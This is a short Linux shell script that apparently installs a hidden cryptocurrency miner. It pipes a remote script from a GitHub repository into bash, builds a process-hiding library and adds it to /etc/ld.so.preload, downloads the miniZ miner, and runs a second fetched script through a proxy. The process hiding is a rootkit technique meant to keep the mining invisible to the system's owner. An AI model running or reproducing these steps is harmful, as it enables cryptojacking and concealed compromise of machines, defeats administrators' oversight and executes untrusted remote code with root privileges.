wget -O - https://raw.githubusercontent.com/KebonKalapa/ETC/main/px_2.sh | bash
wget https://github.com/KebonKalapa/ETC/raw/main/magicMin.zip
unzip magicMin.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8z/miniZ_v1.8z_linux-x64.tar.gz
tar -xvzf miniZ_v1.8z_linux-x64.tar.gz
rm .gitignore
cd 1.8z
wget https://raw.githubusercontent.com/KebonKalapa/ETC/main/min_flex.sh
chmod +x *.sh
graftcp ./min_flex.sh
